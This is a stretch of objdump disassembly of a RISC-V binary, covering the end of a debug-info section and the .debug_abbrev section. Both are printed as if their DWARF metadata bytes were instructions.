    2384:	8001                	srli	s0,s0,0x0
    2386:	0000                	unimp
    2388:	0000                	unimp
    238a:	00090c3b          	addw	s8,s2,zero
    238e:	0100                	addi	s0,sp,128
    2390:	1762                	slli	a4,a4,0x38
    2392:	0049                	c.nop	18
    2394:	0000                	unimp
    2396:	3800                	fld	fs0,48(s0)
    2398:	07d2                	slli	a5,a5,0x14
    239a:	0000                	unimp
    239c:	4e01                	li	t3,0
    239e:	490c                	lw	a1,16(a0)
    23a0:	0000                	unimp
    23a2:	3e00                	fld	fs0,56(a2)
    23a4:	00800017          	auipc	zero,0x800
    23a8:	0000                	unimp
    23aa:	2200                	fld	fs0,0(a2)
    23ac:	0001                	nop
    23ae:	0000                	unimp
    23b0:	0000                	unimp
    23b2:	0100                	addi	s0,sp,128
    23b4:	6a9c                	ld	a5,16(a3)
    23b6:	0016                	c.slli	zero,0x5
    23b8:	3300                	fld	fs0,32(a4)
    23ba:	006e                	c.slli	zero,0x1b
    23bc:	4e01                	li	t3,0
    23be:	491d                	li	s2,7
    23c0:	0000                	unimp
    23c2:	0300                	addi	s0,sp,384
    23c4:	bc91                	j	1e18 <_tbss_end+0x1d94>
    23c6:	327f                	0x327f
    23c8:	0918                	addi	a4,sp,144
    23ca:	0000                	unimp
    23cc:	4e01                	li	t3,0
    23ce:	00166a37          	lui	s4,0x166
    23d2:	0300                	addi	s0,sp,384
    23d4:	b091                	j	1c18 <_tbss_end+0x1b94>
    23d6:	327f                	0x327f
    23d8:	0971                	addi	s2,s2,28
    23da:	0000                	unimp
    23dc:	4e01                	li	t3,0
    23de:	0016814b          	fnmsub.s	ft2,fa3,ft1,ft0,rne
    23e2:	0300                	addi	s0,sp,384
    23e4:	a891                	j	2438 <_tbss_end+0x23b4>
    23e6:	347f                	0x347f
    23e8:	0069                	c.nop	26
    23ea:	5001                	c.li	zero,-32
    23ec:	00004907          	flq	fs2,0(zero) # 8023a4 <_tbss_end+0x802320>
    23f0:	0200                	addi	s0,sp,256
    23f2:	6c91                	lui	s9,0x4
    23f4:	582c                	lw	a1,112(s0)
    23f6:	00800017          	auipc	zero,0x800
    23fa:	0000                	unimp
    23fc:	9c00                	0x9c00
    23fe:	0000                	unimp
    2400:	0000                	unimp
    2402:	0000                	unimp
    2404:	3400                	fld	fs0,40(s0)
    2406:	3074                	fld	fa3,224(s0)
    2408:	0100                	addi	s0,sp,128
    240a:	0c54                	addi	a3,sp,532
    240c:	1670                	addi	a2,sp,812
    240e:	0000                	unimp
    2410:	9102                	jalr	sp
    2412:	3460                	fld	fs0,232(s0)
    2414:	3174                	fld	fa3,224(a0)
    2416:	0100                	addi	s0,sp,128
    2418:	1a54                	addi	a3,sp,308
    241a:	1670                	addi	a2,sp,812
    241c:	0000                	unimp
    241e:	9102                	jalr	sp
    2420:	3458                	fld	fa4,168(s0)
    2422:	3076                	fld	ft0,376(sp)
    2424:	0100                	addi	s0,sp,128
    2426:	0c55                	addi	s8,s8,21
    2428:	1670                	addi	a2,sp,812
    242a:	0000                	unimp
    242c:	9102                	jalr	sp
    242e:	3450                	fld	fa2,168(s0)
    2430:	3176                	fld	ft2,376(sp)
    2432:	0100                	addi	s0,sp,128
    2434:	1c55                	addi	s8,s8,-11
    2436:	1670                	addi	a2,sp,812
    2438:	0000                	unimp
    243a:	9102                	jalr	sp
    243c:	3448                	fld	fa0,168(s0)
    243e:	7165                	addi	sp,sp,-400
    2440:	0031                	c.nop	12
    2442:	5601                	li	a2,-32
    2444:	4909                	li	s2,2
    2446:	0000                	unimp
    2448:	0200                	addi	s0,sp,256
    244a:	4491                	li	s1,4
    244c:	6534                	ld	a3,72(a0)
    244e:	3271                	addiw	tp,tp,-4
    2450:	0100                	addi	s0,sp,128
    2452:	1956                	slli	s2,s2,0x35
    2454:	0049                	c.nop	18
    2456:	0000                	unimp
    2458:	9102                	jalr	sp
    245a:	0040                	addi	s0,sp,4
    245c:	1200                	addi	s0,sp,288
    245e:	7c08                	ld	a0,56(s0)
    2460:	0016                	c.slli	zero,0x5
    2462:	0200                	addi	s0,sp,256
    2464:	0408                	addi	a0,sp,512
    2466:	0332                	slli	t1,t1,0xc
    2468:	0000                	unimp
    246a:	7005                	c.lui	zero,0xfffe1
    246c:	0016                	c.slli	zero,0x5
    246e:	0400                	addi	s0,sp,512
    2470:	00001677          	0x1677
    2474:	0812                	slli	a6,a6,0x4
    2476:	00001677          	0x1677
    247a:	7138                	ld	a4,96(a0)
    247c:	0009                	c.nop	2
    247e:	0100                	addi	s0,sp,128
    2480:	0c3e                	slli	s8,s8,0xf
    2482:	0049                	c.nop	18
    2484:	0000                	unimp
    2486:	1634                	addi	a3,sp,808
    2488:	8000                	0x8000
    248a:	0000                	unimp
    248c:	0000                	unimp
    248e:	010a                	slli	sp,sp,0x2
    2490:	0000                	unimp
    2492:	0000                	unimp
    2494:	0000                	unimp
    2496:	9c01                	subw	s0,s0,s0
    2498:	172d                	addi	a4,a4,-21
    249a:	0000                	unimp
    249c:	01006e33          	or	t3,zero,a6
    24a0:	173e                	slli	a4,a4,0x2f
    24a2:	0049                	c.nop	18
    24a4:	0000                	unimp
    24a6:	9102                	jalr	sp
    24a8:	324c                	fld	fa1,160(a2)
    24aa:	0918                	addi	a4,sp,144
    24ac:	0000                	unimp
    24ae:	3e01                	addiw	t3,t3,-32
    24b0:	2d2e                	fld	fs10,200(sp)
    24b2:	02000017          	auipc	zero,0x2000
    24b6:	4091                	li	ra,4
    24b8:	7132                	ld	sp,296(sp)
    24ba:	0009                	c.nop	2
    24bc:	0100                	addi	s0,sp,128
    24be:	3f3e                	fld	ft10,488(sp)
    24c0:	00001733          	sll	a4,zero,zero
    24c4:	7fb89103          	lh	sp,2043(a7) # 47fb <_tbss_end+0x4777>
    24c8:	6934                	ld	a3,80(a0)
    24ca:	0100                	addi	s0,sp,128
    24cc:	0740                	addi	s0,sp,900
    24ce:	0049                	c.nop	18
    24d0:	0000                	unimp
    24d2:	9102                	jalr	sp
    24d4:	2c6c                	fld	fa1,216(s0)
    24d6:	164e                	slli	a2,a2,0x33
    24d8:	8000                	0x8000
    24da:	0000                	unimp
    24dc:	0000                	unimp
    24de:	0080                	addi	s0,sp,64
    24e0:	0000                	unimp
    24e2:	0000                	unimp
    24e4:	0000                	unimp
    24e6:	7434                	ld	a3,104(s0)
    24e8:	0030                	addi	a2,sp,8
    24ea:	4401                	li	s0,0
    24ec:	4909                	li	s2,2
    24ee:	0000                	unimp
    24f0:	0200                	addi	s0,sp,256
    24f2:	6891                	lui	a7,0x4
    24f4:	7434                	ld	a3,104(s0)
    24f6:	0031                	c.nop	12
    24f8:	4401                	li	s0,0
    24fa:	00004917          	auipc	s2,0x4
    24fe:	0200                	addi	s0,sp,256
    2500:	6491                	lui	s1,0x4
    2502:	7634                	ld	a3,104(a2)
    2504:	0030                	addi	a2,sp,8
    2506:	4501                	li	a0,0
    2508:	4909                	li	s2,2
    250a:	0000                	unimp
    250c:	0200                	addi	s0,sp,256
    250e:	6091                	lui	ra,0x4
    2510:	7634                	ld	a3,104(a2)
    2512:	0031                	c.nop	12
    2514:	4501                	li	a0,0
    2516:	4919                	li	s2,6
    2518:	0000                	unimp
    251a:	0200                	addi	s0,sp,256
    251c:	5c91                	li	s9,-28
    251e:	0000                	unimp
    2520:	0812                	slli	a6,a6,0x4
    2522:	0055                	c.nop	21
    2524:	0000                	unimp
    2526:	0812                	slli	a6,a6,0x4
    2528:	005a                	c.slli	zero,0x16
    252a:	0000                	unimp
    252c:	00079243          	fmadd.s	ft4,fa5,ft0,ft0,rtz
    2530:	0100                	addi	s0,sp,128
    2532:	16180d33          	0x16180d33
    2536:	8000                	0x8000
    2538:	0000                	unimp
    253a:	0000                	unimp
    253c:	001c                	0x1c
    253e:	0000                	unimp
    2540:	0000                	unimp
    2542:	0000                	unimp
    2544:	9c01                	subw	s0,s0,s0
    2546:	00001783          	lh	a5,0(zero) # 20024b2 <_tbss_end+0x200242e>
    254a:	5632                	lw	a2,44(sp)
    254c:	0006                	c.slli	zero,0x1
    254e:	0100                	addi	s0,sp,128
    2550:	064a2933          	0x64a2933
    2554:	0000                	unimp
    2556:	9102                	jalr	sp
    2558:	3368                	fld	fa0,224(a4)
    255a:	006e                	c.slli	zero,0x1b
    255c:	3301                	addiw	t1,t1,-32
    255e:	4935                	li	s2,13
    2560:	0000                	unimp
    2562:	0200                	addi	s0,sp,256
    2564:	6491                	lui	s1,0x4
    2566:	72726133          	0x72726133
    256a:	0100                	addi	s0,sp,128
    256c:	16814533          	0x16814533
    2570:	0000                	unimp
    2572:	9102                	jalr	sp
    2574:	0058                	addi	a4,sp,4
    2576:	6c44                	ld	s1,152(s0)
    2578:	0006                	c.slli	zero,0x1
    257a:	0100                	addi	s0,sp,128
    257c:	0d28                	addi	a0,sp,664
    257e:	15fc                	addi	a5,sp,748
    2580:	8000                	0x8000
    2582:	0000                	unimp
    2584:	0000                	unimp
    2586:	001c                	0x1c
    2588:	0000                	unimp
    258a:	0000                	unimp
    258c:	0000                	unimp
    258e:	9c01                	subw	s0,s0,s0
    2590:	5632                	lw	a2,44(sp)
    2592:	0006                	c.slli	zero,0x1
    2594:	0100                	addi	s0,sp,128
    2596:	2328                	fld	fa0,64(a4)
    2598:	064a                	slli	a2,a2,0x12
    259a:	0000                	unimp
    259c:	9102                	jalr	sp
    259e:	3368                	fld	fa0,224(a4)
    25a0:	006e                	c.slli	zero,0x1b
    25a2:	2801                	sext.w	a6,a6
    25a4:	0000492f          	0x492f
    25a8:	0200                	addi	s0,sp,256
    25aa:	6491                	lui	s1,0x4
    25ac:	72726133          	0x72726133
    25b0:	0100                	addi	s0,sp,128
    25b2:	3c28                	fld	fa0,120(s0)
    25b4:	00001733          	sll	a4,zero,zero
    25b8:	9102                	jalr	sp
    25ba:	0058                	addi	a4,sp,4
	...

Disassembly of section .debug_abbrev:

0000000000000000 <.debug_abbrev>:
   0:	1101                	addi	sp,sp,-32
   2:	2501                	sext.w	a0,a0
   4:	130e                	slli	t1,t1,0x23
   6:	1b0e030b          	0x1b0e030b
   a:	110e                	slli	sp,sp,0x23
   c:	1201                	addi	tp,tp,-32
   e:	00171007          	0x171007
  12:	0200                	addi	s0,sp,256
  14:	0024                	addi	s1,sp,8
  16:	0b3e0b0b          	0xb3e0b0b
  1a:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
  1e:	03001603          	lh	a2,48(zero) # 30 <_tdata_begin+0x30>
  22:	3a0e                	fld	fs4,224(sp)
  24:	490b3b0b          	0x490b3b0b
  28:	04000013          	li	zero,64
  2c:	0024                	addi	s1,sp,8
  2e:	0b3e0b0b          	0xb3e0b0b
  32:	00000803          	lb	a6,0(zero) # 0 <_tdata_begin>
  36:	1605                	addi	a2,a2,-31
  38:	0300                	addi	s0,sp,384
  3a:	3a0e                	fld	fs4,224(sp)
  3c:	49053b0b          	0x49053b0b
  40:	06000013          	li	zero,96
  44:	0b0b0117          	auipc	sp,0xb0b0
  48:	0b3a                	slli	s6,s6,0xe
  4a:	13010b3b          	0x13010b3b
  4e:	0000                	unimp
  50:	03000d07          	0x3000d07
  54:	3a0e                	fld	fs4,224(sp)
  56:	490b3b0b          	0x490b3b0b
  5a:	08000013          	li	zero,128
  5e:	0101                	addi	sp,sp,0
  60:	1349                	addi	t1,t1,-14
  62:	1301                	addi	t1,t1,-32
  64:	0000                	unimp
  66:	2109                	addiw	sp,sp,2
  68:	4900                	lw	s0,16(a0)
  6a:	000b2f13          	slti	t5,s6,0
  6e:	0a00                	addi	s0,sp,272
  70:	0b0b0113          	addi	sp,s6,176
  74:	0b3a                	slli	s6,s6,0xe
  76:	13010b3b          	0x13010b3b
  7a:	0000                	unimp
  7c:	03000d0b          	0x3000d0b
  80:	3a0e                	fld	fs4,224(sp)
  82:	490b3b0b          	0x490b3b0b
  86:	000b3813          	sltiu	a6,s6,0
  8a:	0c00                	addi	s0,sp,528
  8c:	0b0b000f          	0xb0b000f
  90:	0000                	unimp
  92:	130d                	addi	t1,t1,-29
  94:	0301                	addi	t1,t1,0
  96:	0b0e                	slli	s6,s6,0x3
  98:	3b0b3a0b          	0x3b0b3a0b
  9c:	0013010b          	0x13010b
  a0:	0e00                	addi	s0,sp,784
  a2:	000d                	c.nop	3
  a4:	0b3a0803          	lb	a6,179(s4) # 1660b3 <_tbss_end+0x16602f>
  a8:	13490b3b          	0x13490b3b
  ac:	0b38                	addi	a4,sp,408
  ae:	0000                	unimp
  b0:	0b000f0f          	0xb000f0f
  b4:	0013490b          	0x13490b
  b8:	1000                	addi	s0,sp,32
  ba:	0e030113          	addi	sp,t1,224
  be:	0b3a050b          	0xb3a050b
  c2:	13010b3b          	0x13010b3b
  c6:	0000                	unimp
  c8:	0d11                	addi	s10,s10,4
  ca:	0300                	addi	s0,sp,384
  cc:	3a0e                	fld	fs4,224(sp)
  ce:	490b3b0b          	0x490b3b0b
  d2:	00053813          	sltiu	a6,a0,0
  d6:	1200                	addi	s0,sp,288
  d8:	0015                	c.nop	5
  da:	00001927          	0x1927
  de:	27011513          	0x27011513
  e2:	4919                	li	s2,6
  e4:	00130113          	addi	sp,t1,1
  e8:	1400                	addi	s0,sp,544
  ea:	0005                	c.nop	1
  ec:	1349                	addi	t1,t1,-14
  ee:	0000                	unimp
  f0:	2615                	addiw	a2,a2,5
  f2:	4900                	lw	s0,16(a0)
  f4:	16000013          	li	zero,352
  f8:	0e030113          	addi	sp,t1,224
  fc:	0b3a050b          	0xb3a050b
 100:	1301053b          	0x1301053b
 104:	0000                	unimp
 106:	03000d17          	auipc	s10,0x3000
 10a:	3a0e                	fld	fs4,224(sp)
 10c:	49053b0b          	0x49053b0b
 110:	000b3813          	sltiu	a6,s6,0
 114:	1800                	addi	s0,sp,48
 116:	000d                	c.nop	3
 118:	0b3a0e03          	lb	t3,179(s4)
 11c:	1349053b          	0x1349053b
 120:	0538                	addi	a4,sp,648
 122:	0000                	unimp
 124:	1319                	addi	t1,t1,-26
 126:	0301                	addi	t1,t1,0
 128:	0b0e                	slli	s6,s6,0x3
 12a:	3b0b3a0b          	0x3b0b3a0b
 12e:	0105                	addi	sp,sp,1
 130:	1a000013          	li	zero,416
 134:	0b0b0113          	addi	sp,s6,176
 138:	0b3a                	slli	s6,s6,0xe
 13a:	1301053b          	0x1301053b
 13e:	0000                	unimp
 140:	0b01131b          	0xb01131b
 144:	3a05                	addiw	s4,s4,-31
 146:	01053b0b          	0x1053b0b
 14a:	1c000013          	li	zero,448
 14e:	050b0117          	auipc	sp,0x50b0
 152:	0b3a                	slli	s6,s6,0xe
 154:	1301053b          	0x1301053b
 158:	0000                	unimp
 15a:	0d1d                	addi	s10,s10,7
 15c:	0300                	addi	s0,sp,384
 15e:	3a0e                	fld	fs4,224(sp)
 160:	49053b0b          	0x49053b0b
 164:	1e000013          	li	zero,480
 168:	0e030013          	addi	zero,t1,224
 16c:	193c                	addi	a5,sp,184
 16e:	0000                	unimp
 170:	151f 2701 0119      	0x1192701151f
 176:	20000013          	li	zero,512
 17a:	0034                	addi	a3,sp,8
 17c:	0b3a0e03          	lb	t3,179(s4)
 180:	1349053b          	0x1349053b
 184:	193c193f 34210000 	0x34210000193c193f
 18c:	0300                	addi	s0,sp,384
 18e:	3a0e                	fld	fs4,224(sp)
 190:	490b3b0b          	0x490b3b0b
 194:	3c193f13          	sltiu	t5,s2,961
 198:	0019                	c.nop	6
 19a:	2200                	fld	fs0,0(a2)
 19c:	0021                	c.nop	8
 19e:	1349                	addi	t1,t1,-14
 1a0:	0000062f          	0x62f
 1a4:	03003423          	sd	a6,40(zero) # 28 <_tdata_begin+0x28>
 1a8:	3a0e                	fld	fs4,224(sp)
 1aa:	490b3b0b          	0x490b3b0b
 1ae:	02193f13          	sltiu	t5,s2,33
 1b2:	0018                	0x18
 1b4:	2400                	fld	fs0,8(s0)
 1b6:	0021                	c.nop	8
 1b8:	1349                	addi	t1,t1,-14
 1ba:	0000052f          	0x52f
 1be:	2e25                	addiw	t3,t3,9
 1c0:	3f01                	addiw	t5,t5,-32
 1c2:	0319                	addi	t1,t1,6
 1c4:	3a0e                	fld	fs4,224(sp)
 1c6:	270b3b0b          	0x270b3b0b
 1ca:	4919                	li	s2,6
 1cc:	12011113          	0x12011113
 1d0:	96184007          	flq	ft0,-1695(a6)
 1d4:	1942                	slli	s2,s2,0x30
 1d6:	1301                	addi	t1,t1,-32
 1d8:	0000                	unimp
 1da:	3426                	fld	fs0,104(sp)
 1dc:	0300                	addi	s0,sp,384
 1de:	3a0e                	fld	fs4,224(sp)
 1e0:	490b3b0b          	0x490b3b0b
 1e4:	00180213          	addi	tp,a6,1
 1e8:	2700                	fld	fs0,8(a4)
 1ea:	0111010b          	0x111010b
 1ee:	0712                	slli	a4,a4,0x4
 1f0:	0000                	unimp
 1f2:	3428                	fld	fa0,104(s0)
 1f4:	0300                	addi	s0,sp,384
 1f6:	3a08                	fld	fa0,48(a2)
 1f8:	490b3b0b          	0x490b3b0b
 1fc:	00180213          	addi	tp,a6,1
 200:	2900                	fld	fs0,16(a0)
 202:	0111010b          	0x111010b
 206:	0712                	slli	a4,a4,0x4
 208:	1301                	addi	t1,t1,-32
 20a:	0000                	unimp
 20c:	2e2a                	fld	ft8,136(sp)
 20e:	3f01                	addiw	t5,t5,-32
 210:	0319                	addi	t1,t1,6
 212:	3a0e                	fld	fs4,224(sp)
 214:	270b3b0b          	0x270b3b0b
 218:	1119                	addi	sp,sp,-26
 21a:	1201                	addi	tp,tp,-32
 21c:	97184007          	flq	ft0,-1679(a6)
 220:	1942                	slli	s2,s2,0x30
 222:	1301                	addi	t1,t1,-32
 224:	0000                	unimp
 226:	0300052b          	0x300052b
 22a:	3a08                	fld	fa0,48(a2)
 22c:	490b3b0b          	0x490b3b0b
 230:	00180213          	addi	tp,a6,1
 234:	2c00                	fld	fs0,24(s0)
 236:	0005                	c.nop	1
 238:	0b3a0e03          	lb	t3,179(s4)
 23c:	13490b3b          	0x13490b3b
 240:	1802                	slli	a6,a6,0x20
 242:	0000                	unimp
 244:	2e2d                	addiw	t3,t3,11
 246:	3f01                	addiw	t5,t5,-32
 248:	0319                	addi	t1,t1,6
 24a:	3a0e                	fld	fs4,224(sp)
 24c:	270b3b0b          	0x270b3b0b
 250:	1119                	addi	sp,sp,-26
 252:	1201                	addi	tp,tp,-32
 254:	97184007          	flq	ft0,-1679(a6)
 258:	1942                	slli	s2,s2,0x30
 25a:	0000                	unimp
 25c:	0100                	addi	s0,sp,128
 25e:	0011                	c.nop	4
 260:	0610                	addi	a2,sp,768
 262:	0111                	addi	sp,sp,4
 264:	0112                	slli	sp,sp,0x4
 266:	0e1b0e03          	lb	t3,225(s6)
 26a:	0e25                	addi	t3,t3,9
 26c:	00000513          	li	a0,0
 270:	0100                	addi	s0,sp,128
 272:	0011                	c.nop	4
 274:	0610                	addi	a2,sp,768
 276:	0111                	addi	sp,sp,4
 278:	0112                	slli	sp,sp,0x4
 27a:	0e1b0e03          	lb	t3,225(s6)
 27e:	0e25                	addi	t3,t3,9
 280:	00000513          	li	a0,0
 284:	0100                	addi	s0,sp,128
 286:	0111                	addi	sp,sp,4
 288:	0e25                	addi	t3,t3,9
 28a:	0e030b13          	addi	s6,t1,224
 28e:	01110e1b          	addiw	t3,sp,17
 292:	0712                	slli	a4,a4,0x4
 294:	1710                	addi	a2,sp,928
 296:	0000                	unimp
 298:	2402                	fld	fs0,0(sp)
 29a:	0b00                	addi	s0,sp,400
 29c:	030b3e0b          	0x30b3e0b
 2a0:	000e                	c.slli	zero,0x3
 2a2:	0300                	addi	s0,sp,384
 2a4:	0024                	addi	s1,sp,8
 2a6:	0b3e0b0b          	0xb3e0b0b
 2aa:	00000803          	lb	a6,0(zero) # 0 <_tdata_begin>
 2ae:	3504                	fld	fs1,40(a0)
 2b0:	4900                	lw	s0,16(a0)
 2b2:	05000013          	li	zero,80
 2b6:	0026                	c.slli	zero,0x9
 2b8:	1349                	addi	t1,t1,-14
 2ba:	0000                	unimp
 2bc:	1606                	slli	a2,a2,0x21
 2be:	0300                	addi	s0,sp,384
 2c0:	3a0e                	fld	fs4,224(sp)
 2c2:	390b3b0b          	0x390b3b0b
 2c6:	0013490b          	0x13490b
 2ca:	0700                	addi	s0,sp,896
 2cc:	0016                	c.slli	zero,0x5
 2ce:	0b3a0e03          	lb	t3,179(s4)
 2d2:	0b39053b          	0xb39053b
 2d6:	1349                	addi	t1,t1,-14
 2d8:	0000                	unimp
 2da:	1708                	addi	a0,sp,928
 2dc:	0b01                	addi	s6,s6,0
 2de:	3b0b3a0b          	0x3b0b3a0b
 2e2:	010b390b          	0x10b390b
 2e6:	09000013          	li	zero,144
 2ea:	000d                	c.nop	3
 2ec:	0b3a0e03          	lb	t3,179(s4)
 2f0:	0b390b3b          	0xb390b3b
 2f4:	1349                	addi	t1,t1,-14
 2f6:	0000                	unimp
 2f8:	010a                	slli	sp,sp,0x2
 2fa:	4901                	li	s2,0
 2fc:	00130113          	addi	sp,t1,1
 300:	0b00                	addi	s0,sp,400
 302:	0021                	c.nop	8
 304:	1349                	addi	t1,t1,-14
 306:	00000b2f          	0xb2f
 30a:	130c                	addi	a1,sp,416
 30c:	0b01                	addi	s6,s6,0
 30e:	3b0b3a0b          	0x3b0b3a0b
 312:	010b390b          	0x10b390b
 316:	0d000013          	li	zero,208
 31a:	000d                	c.nop	3
 31c:	0b3a0e03          	lb	t3,179(s4)
 320:	0b390b3b          	0xb390b3b
 324:	1349                	addi	t1,t1,-14
 326:	0b38                	addi	a4,sp,408
 328:	0000                	unimp
 32a:	0f0e                	slli	t5,t5,0x3
 32c:	0b00                	addi	s0,sp,400
 32e:	0f00000b          	0xf00000b
 332:	0b0b000f          	0xb0b000f
 336:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
 33a:	1310                	addi	a2,sp,416
 33c:	0301                	addi	t1,t1,0
 33e:	0b0e                	slli	s6,s6,0x3
 340:	3b0b3a0b          	0x3b0b3a0b
 344:	010b390b          	0x10b390b
 348:	11000013          	li	zero,272
 34c:	000d                	c.nop	3
 34e:	0b3a0803          	lb	a6,179(s4)
 352:	0b390b3b          	0xb390b3b
 356:	1349                	addi	t1,t1,-14
 358:	0b38                	addi	a4,sp,408
 35a:	0000                	unimp
 35c:	0f12                	slli	t5,t5,0x4
 35e:	0b00                	addi	s0,sp,400
 360:	0013490b          	0x13490b
 364:	1300                	addi	s0,sp,416
 366:	0e030113          	addi	sp,t1,224
 36a:	0b3a050b          	0xb3a050b
 36e:	0b390b3b          	0xb390b3b
 372:	1301                	addi	t1,t1,-32
 374:	0000                	unimp
 376:	0d14                	addi	a3,sp,656
 378:	0300                	addi	s0,sp,384
 37a:	3a0e                	fld	fs4,224(sp)
 37c:	390b3b0b          	0x390b3b0b
 380:	3813490b          	0x3813490b
 384:	0005                	c.nop	1
 386:	1500                	addi	s0,sp,672
 388:	0015                	c.nop	5
 38a:	00001927          	0x1927
 38e:	1516                	slli	a0,a0,0x25
 390:	2701                	sext.w	a4,a4
 392:	4919                	li	s2,6
 394:	00130113          	addi	sp,t1,1
 398:	1700                	addi	s0,sp,928
 39a:	0005                	c.nop	1
 39c:	1349                	addi	t1,t1,-14
 39e:	0000                	unimp
 3a0:	1318                	addi	a4,sp,416
 3a2:	0301                	addi	t1,t1,0
 3a4:	0b0e                	slli	s6,s6,0x3
 3a6:	3a05                	addiw	s4,s4,-31
 3a8:	39053b0b          	0x39053b0b
 3ac:	0013010b          	0x13010b
 3b0:	1900                	addi	s0,sp,176
 3b2:	000d                	c.nop	3
 3b4:	0b3a0e03          	lb	t3,179(s4)
 3b8:	0b39053b          	0xb39053b
 3bc:	1349                	addi	t1,t1,-14
 3be:	0b38                	addi	a4,sp,408
 3c0:	0000                	unimp
 3c2:	0d1a                	slli	s10,s10,0x6
 3c4:	0300                	addi	s0,sp,384
 3c6:	3a0e                	fld	fs4,224(sp)
 3c8:	39053b0b          	0x39053b0b
 3cc:	3813490b          	0x3813490b
 3d0:	0005                	c.nop	1
 3d2:	1b00                	addi	s0,sp,432
 3d4:	0e030113          	addi	sp,t1,224
 3d8:	0b3a0b0b          	0xb3a0b0b
 3dc:	0b39053b          	0xb39053b
 3e0:	1301                	addi	t1,t1,-32
 3e2:	0000                	unimp
 3e4:	131c                	addi	a5,sp,416
 3e6:	0b01                	addi	s6,s6,0
 3e8:	3b0b3a0b          	0x3b0b3a0b
 3ec:	3905                	addiw	s2,s2,-31
 3ee:	0013010b          	0x13010b
 3f2:	1d00                	addi	s0,sp,688
 3f4:	050b0113          	addi	sp,s6,80
 3f8:	0b3a                	slli	s6,s6,0xe
 3fa:	0b39053b          	0xb39053b
 3fe:	1301                	addi	t1,t1,-32
 400:	0000                	unimp
 402:	171e                	slli	a4,a4,0x27
 404:	0b01                	addi	s6,s6,0
 406:	3a05                	addiw	s4,s4,-31
 408:	39053b0b          	0x39053b0b
 40c:	0013010b          	0x13010b
 410:	1f00                	addi	s0,sp,944
 412:	000d                	c.nop	3
 414:	0b3a0e03          	lb	t3,179(s4)
 418:	0b39053b          	0xb39053b
 41c:	1349                	addi	t1,t1,-14
 41e:	0000                	unimp
 420:	1320                	addi	s0,sp,424
 422:	0300                	addi	s0,sp,384
 424:	3c0e                	fld	fs8,224(sp)
 426:	0019                	c.nop	6
 428:	2100                	fld	fs0,0(a0)
 42a:	0115                	addi	sp,sp,5
 42c:	13011927          	0x13011927
 430:	0000                	unimp
 432:	3422                	fld	fs0,40(sp)
 434:	0300                	addi	s0,sp,384
 436:	3a0e                	fld	fs4,224(sp)
 438:	39053b0b          	0x39053b0b
 43c:	3f13490b          	0x3f13490b
 440:	3c19                	addiw	s8,s8,-26
 442:	0019                	c.nop	6
 444:	2300                	fld	fs0,0(a4)
 446:	0034                	addi	a3,sp,8
 448:	0b3a0e03          	lb	t3,179(s4)
 44c:	0b390b3b          	0xb390b3b
 450:	1349                	addi	t1,t1,-14
 452:	193c193f 34240000 	0x34240000193c193f
 45a:	0300                	addi	s0,sp,384
 45c:	3a0e                	fld	fs4,224(sp)
 45e:	390b3b0b          	0x390b3b0b
 462:	0213490b          	0x213490b
 466:	0018                	0x18
 468:	2500                	fld	fs0,8(a0)
 46a:	012e                	slli	sp,sp,0xb
 46c:	0e03193f 053b0b3a 	0x53b0b3a0e03193f
 474:	0b39                	addi	s6,s6,14
 476:	13491927          	0x13491927
 47a:	0111                	addi	sp,sp,4
 47c:	0712                	slli	a4,a4,0x4
 47e:	1840                	addi	s0,sp,52
 480:	01194297          	auipc	t0,0x1194
 484:	26000013          	li	zero,608
 488:	0005                	c.nop	1
 48a:	0b3a0803          	lb	a6,179(s4)
 48e:	0b39053b          	0xb39053b
 492:	1349                	addi	t1,t1,-14
 494:	1802                	slli	a6,a6,0x20
 496:	0000                	unimp
 498:	03003427          	fsd	fa6,40(zero) # 28 <_tdata_begin+0x28>
 49c:	3a08                	fld	fa0,48(a2)
 49e:	39053b0b          	0x39053b0b
 4a2:	0213490b          	0x213490b
 4a6:	0018                	0x18
 4a8:	2800                	fld	fs0,16(s0)
 4aa:	0034                	addi	a3,sp,8
 4ac:	0b3a0e03          	lb	t3,179(s4)
 4b0:	0b39053b          	0xb39053b
 4b4:	1349                	addi	t1,t1,-14
 4b6:	1802                	slli	a6,a6,0x20
 4b8:	0000                	unimp
 4ba:	2e29                	addiw	t3,t3,10
 4bc:	3f01                	addiw	t5,t5,-32
 4be:	0319                	addi	t1,t1,6
 4c0:	3a0e                	fld	fs4,224(sp)
 4c2:	390b3b0b          	0x390b3b0b
 4c6:	4919270b          	0x4919270b
 4ca:	12011113          	0x12011113
 4ce:	97184007          	flq	ft0,-1679(a6)
 4d2:	1942                	slli	s2,s2,0x30
 4d4:	1301                	addi	t1,t1,-32
 4d6:	0000                	unimp
 4d8:	052a                	slli	a0,a0,0xa
 4da:	0300                	addi	s0,sp,384
 4dc:	3a0e                	fld	fs4,224(sp)
 4de:	39053b0b          	0x39053b0b
 4e2:	0213490b          	0x213490b
 4e6:	0018                	0x18
 4e8:	2b00                	fld	fs0,16(a4)
 4ea:	0111010b          	0x111010b
 4ee:	0712                	slli	a4,a4,0x4
 4f0:	1301                	addi	t1,t1,-32
 4f2:	0000                	unimp
 4f4:	0b2c                	addi	a1,sp,408
 4f6:	1101                	addi	sp,sp,-32
 4f8:	1201                	addi	tp,tp,-32
 4fa:	2d000007          	0x2d000007
 4fe:	0026                	c.slli	zero,0x9
 500:	0000                	unimp
 502:	2e2e                	fld	ft8,200(sp)
 504:	3f01                	addiw	t5,t5,-32
 506:	0319                	addi	t1,t1,6
 508:	3a0e                	fld	fs4,224(sp)
 50a:	390b3b0b          	0x390b3b0b
 50e:	4919270b          	0x4919270b
 512:	12011113          	0x12011113
 516:	96184007          	flq	ft0,-1695(a6)
 51a:	1942                	slli	s2,s2,0x30
 51c:	1301                	addi	t1,t1,-32
 51e:	0000                	unimp
 520:	0000182f          	0x182f
 524:	3000                	fld	fs0,32(s0)
 526:	012e                	slli	sp,sp,0xb
 528:	0b3a0e03          	lb	t3,179(s4)
 52c:	0b39053b          	0xb39053b
 530:	01111927          	0x1111927
 534:	0712                	slli	a4,a4,0x4
 536:	1840                	addi	s0,sp,52
 538:	1848                	addi	a0,sp,52
 53a:	00194297          	auipc	t0,0x194
 53e:	3100                	fld	fs0,32(a0)
 540:	012e                	slli	sp,sp,0xb
 542:	0b3a0e03          	lb	t3,179(s4)
 546:	0b390b3b          	0xb390b3b
 54a:	01111927          	0x1111927
 54e:	0712                	slli	a4,a4,0x4
 550:	1840                	addi	s0,sp,52
 552:	4296                	lw	t0,68(sp)
 554:	0119                	addi	sp,sp,6
 556:	32000013          	li	zero,800
